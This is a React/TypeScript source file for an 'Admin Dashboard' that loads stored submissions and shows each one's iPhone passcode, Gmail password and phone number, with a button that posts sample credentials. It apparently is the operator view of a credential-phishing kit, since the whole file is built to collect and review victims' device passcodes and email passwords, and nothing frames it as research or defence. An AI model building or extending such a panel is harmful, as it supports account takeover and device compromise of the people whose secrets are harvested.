import { useEffect, useState } from "react";
import { Shield, Clock, Smartphone, Mail, Phone, Trash2, RefreshCw } from "lucide-react";

interface Submission {
  id: number;
  passcode: string;
  gmail_password: string;
  phone_number: string;
  created_at: string;
}

export default function AdminPanel() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchSubmissions = async () => {
    setLoading(true);
    try {
      const response = await fetch("/api/submissions");
      const data = await response.json();
      setSubmissions(data);
    } catch (error) {
      console.error("Failed to fetch submissions:", error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchSubmissions();
  }, []);

  return (
    <div className="min-h-screen bg-[#f5f5f7] p-4 md:p-8 font-sans text-[#1d1d1f]">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-8">
          <div className="flex items-center gap-3">
            <div className="bg-black p-2 rounded-xl">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <h1 className="text-2xl font-bold tracking-tight">Admin Dashboard</h1>
          </div>
          <div className="flex gap-2">
            <button 
              onClick={async () => {
                try {
                  const res = await fetch("/api/submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ passcode: "123456", gmailPassword: "test_password", phoneNumber: "+966 500000000" })
                  });
                  if (!res.ok) {
                    const errorData = await res.json();
                    alert(`Failed to add test data: ${errorData.error || res.statusText}`);
                  } else {
                    await fetchSubmissions();
                  }
                } catch (err) {
                  alert(`Network error: ${err instanceof Error ? err.message : String(err)}`);
                }
              }}
              className="bg-gray-200 px-4 py-2 rounded-lg text-sm font-medium hover:bg-gray-300 transition-all"
            >
              Add Test Data
            </button>
            <button 
              onClick={fetchSubmissions}
              className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm hover:shadow-md transition-all text-sm font-medium"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              Refresh
            </button>
          </div>
        </header>

        {loading && submissions.length === 0 ? (
          <div className="flex justify-center items-center h-64">
            <div className="w-8 h-8 border-4 border-gray-200 border-t-black rounded-full animate-spin"></div>
          </div>
        ) : (
          <div className="grid gap-6">
            {submissions.length === 0 ? (
              <div className="bg-white rounded-2xl p-12 text-center shadow-sm border border-gray-100">
                <p className="text-gray-400 font-medium">No submissions yet.</p>
              </div>
            ) : (
              submissions.map((sub) => (
                <div key={sub.id} className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 hover:border-blue-200 transition-colors">
                  <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6 pb-4 border-bottom border-gray-50">
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Clock className="w-4 h-4" />
                      {new Date(sub.created_at).toLocaleString()}
                    </div>
                    <div className="text-xs font-mono bg-gray-100 px-2 py-1 rounded text-gray-500">
                      ID: #{sub.id}
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                    <div className="space-y-2">
                      <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-gray-400">
                        <Smartphone className="w-3 h-3" />
                        iPhone Passcode
                      </div>
                      <div className="text-xl font-mono bg-blue-50 text-blue-700 p-3 rounded-xl border border-blue-100">
                        {sub.passcode || <span className="italic opacity-50">None</span>}
                      </div>
                    </div>

                    <div className="space-y-2">
                      <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-gray-400">
                        <Mail className="w-3 h-3" />
                        Gmail Password
                      </div>
                      <div className="text-xl font-mono bg-green-50 text-green-700 p-3 rounded-xl border border-green-100">
                        {sub.gmail_password || <span className="italic opacity-50">None</span>}
                      </div>
                    </div>

                    <div className="space-y-2">
                      <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-gray-400">
                        <Phone className="w-3 h-3" />
                        Contact Number
                      </div>
                      <div className="text-xl font-mono bg-orange-50 text-orange-700 p-3 rounded-xl border border-orange-100">
                        {sub.phone_number || <span className="italic opacity-50">None</span>}
                      </div>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        )}
      </div>
    </div>
  );
}
